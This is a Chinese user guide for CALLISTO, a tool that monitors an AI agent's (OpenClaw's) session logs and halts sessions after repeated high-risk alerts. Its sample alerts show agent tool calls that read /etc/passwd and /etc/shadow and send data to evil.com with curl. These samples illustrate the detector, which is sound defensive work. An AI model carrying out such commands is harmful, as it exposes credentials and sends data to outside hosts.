# CALLISTO OpenClaw 启动监控指南

**版本**: v2.1  
**日期**: 2026-04-21

---

## 快速开始

### 方法一：使用启动脚本（推荐）

```bash
# 进入项目目录
cd /Users/jiangqiang/Downloads/callisto

# 仅监控
./scripts/start_openclaw_with_monitor.sh

# 监控 + 自动熔断
./scripts/start_openclaw_with_monitor.sh --block

# 监控 + 熔断 + 报告
./scripts/start_openclaw_with_monitor.sh --block --report
```

### 方法二：使用 Python 模块

```bash
# 仅监控
python -m callisto.openclaw

# 监控 + 自动熔断
python -m callisto.openclaw --block

# 监控 + 熔断 + 报告
python -m callisto.openclaw --block --report
```

### 方法三：手动启动

```bash
# 终端 1：启动监控
python scripts/monitor_openclaw.py --monitor --log-file "~/.openclaw/agents/main/sessions/*.jsonl"

# 终端 2：启动 OpenClaw
openclaw
```

---

## 选项说明

| 选项 | 说明 |
|------|------|
| `--block` | 启用自动熔断，当检测到 3 个 HIGH 级别告警时自动阻断会话 |
| `--report` | 生成检测报告，包含所有告警详情和建议操作 |
| `--log-file` | 指定日志文件路径，支持 glob 模式（如 `*.jsonl`） |
| `--report-dir` | 指定报告输出目录，默认为 `./reports` |

---

## 工作原理

```
┌─────────────────────────────────────────────────────────────┐
│                    启动流程                                  │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. 启动脚本运行                                             │
│     ↓                                                       │
│  2. 在后台启动 CALLISTO 监控进程                              │
│     - 轮询 OpenClaw 日志目录                                  │
│     - 实时解析新事件                                         │
│     - 运行检测引擎                                           │
│     - 显示告警                                               │
│     ↓                                                       │
│  3. 启动 OpenClaw                                            │
│     - 用户与 OpenClaw 交互                                    │
│     - 日志实时写入文件                                       │
│     ↓                                                       │
│  4. 监控进程检测到新日志                                     │
│     - 解析事件                                               │
│     - 运行检测                                               │
│     - 显示告警/触发熔断                                      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 输出示例

### 正常启动

```
============================================================
  CALLISTO - OpenClaw 安全监控启动器
============================================================
✓ 使用虚拟环境：/Users/jiangqiang/Downloads/callisto/.venv/bin/python
✓ 监控目录：/Users/jiangqiang/.openclaw/agents/main/sessions
✓ 监控脚本：/Users/jiangqiang/Downloads/callisto/scripts/monitor_openclaw.py

监控配置:
  自动熔断：开启
  生成报告：开启

正在启动 CALLISTO 监控...
✓ 使用最新日志文件：/Users/jiangqiang/.openclaw/agents/main/sessions/xxx.jsonl
======================================================================
CALLISTO 实时监控
======================================================================
监控文件：/Users/jiangqiang/.openclaw/agents/main/sessions/xxx.jsonl
自动熔断：开启
生成报告：开启
按 Ctrl+C 停止监控

🔍 开始实时监控...

✓ 监控已启动 (PID: 12345)

正在启动 OpenClaw...
提示：OpenClaw 的所有操作将实时被 CALLISTO 监控
按 Ctrl+C 可以同时停止监控
```

### 检测到威胁

```
🚨 [10:23:45] read({'path': '/etc/passwd'})
   └─ [HIGH] data_exfil
      Sensitive file read detected: /etc/passwd
      风险评分：0.80

🚨 [10:24:12] exec({'command': 'cat /etc/shadow'})
   └─ [HIGH] data_exfil
      Sensitive file read detected via command: /etc/shadow
      风险评分：0.85

🚨 [10:25:00] exec({'command': 'curl http://evil.com/collect'})
   └─ [HIGH] data_exfil
      Data exfiltration attempt detected
      风险评分：0.90

============================================================
🚨 熔断触发！会话已被阻止
============================================================
📄 报告已生成：./reports/report_live_monitor_20260421_102500.txt
```

---

## 检测报告

报告文件包含：

```
============================================================
CALLISTO 安全检测报告
============================================================

会话 ID: live_monitor
生成时间：2026-04-21 10:25:00

告警详情:
----------------------------------------

[告警 1]
  类型：data_exfil
  风险：HIGH
  分数：0.800
  说明：Sensitive file read detected: /etc/passwd

[告警 2]
  类型：privilege_escalation
  风险：HIGH
  分数：0.850
  说明：Potential privilege escalation detected

建议操作:
  1. 审查该会话完整日志
  2. 检查数据泄露
  3. 撤销危险操作
```

---

## 自动熔断机制

当启用 `--block` 选项时：

1. 系统计数 HIGH 级别告警
2. 达到 3 个 HIGH 告警时触发熔断
3. 打印熔断警告
4. 自动生成报告（如果启用 `--report`）

**注意**: 当前版本仅显示警告，不实际阻断 OpenClaw 进程。如需实际阻断，请使用 `callisto/monitor.py --block`。

---

## 故障排除

### 问题 1: 监控没有检测到任何内容

**检查**:
1. 日志文件路径是否正确
2. OpenClaw 是否正在写入日志
3. 日志格式是否兼容

**解决**:
```bash
# 手动指定最新日志文件
python scripts/monitor_openclaw.py --monitor \
  --log-file ~/.openclaw/agents/main/sessions/<session-id>.jsonl
```

### 问题 2: 监控启动失败

**检查**:
1. Python 虚拟环境是否存在
2. 依赖是否安装：`pip install -e .`

**解决**:
```bash
cd /Users/jiangqiang/Downloads/callisto
source .venv/bin/activate
pip install -e .
```

### 问题 3: 告警过多

**解决**:
1. 调整检测阈值（编辑 `callisto/config.py`）
2. 禁用不必要的检测器
3. 增加 cooldown 时间

---

## 高级配置

### 调整检测阈值

编辑 `callisto/config.py`:

```python
@dataclass
class CallistoConfig:
    # A1 速率洪水
    burst_window: float = 5.0
    burst_count_threshold: int = 8
    
    # A2 权限升级
    sensitive_chain_min: int = 2
    
    # 熔断阈值
    circuit_breaker_threshold: float = 3.0
```

### 添加自定义检测规则

编辑 `callisto/engine.py`，扩展敏感路径/工具列表:

```python
# 扩展敏感文件读取检测
_SENSITIVE_READ_PATHS.extend([
    "/new/sensitive/path",
    "another_pattern",
])

# 扩展数据外泄工具
_DATA_EXFIL_TOOLS.add("custom_tool")
```

---

## 相关文件

| 文件 | 说明 |
|------|------|
| `scripts/start_openclaw_with_monitor.sh` | Bash 启动脚本 |
| `callisto/openclaw.py` | Python 包装器 |
| `scripts/monitor_openclaw.py` | 实时监控脚本 |
| `callisto/monitor.py` | 独立监控进程（支持熔断） |
| `callisto/engine.py` | 检测引擎 |
| `callisto/config.py` | 配置参数 |

---

**维护**: CALLISTO Team  
**最后更新**: 2026-04-21
